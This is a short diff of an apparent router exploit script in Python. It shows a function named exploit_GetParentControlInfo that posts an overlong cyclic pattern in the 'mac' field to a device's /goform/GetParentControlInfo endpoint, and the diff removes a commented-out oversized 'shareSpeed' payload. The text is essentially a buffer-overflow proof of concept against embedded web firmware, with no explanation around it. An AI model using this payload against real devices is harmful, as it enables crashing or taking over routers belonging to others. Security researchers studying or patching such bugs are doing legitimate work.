@@ -8,7 +8,6 @@ cyclic3 = b"111,222,333,aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
 def exploit_GetParentControlInfo():
     url = f"http://{host}/goform/GetParentControlInfo"
     data = {
-        # b"shareSpeed":b'A'*0x800
         b'mac':cyclic
     }
     res = requests.post(url=url,data=data)
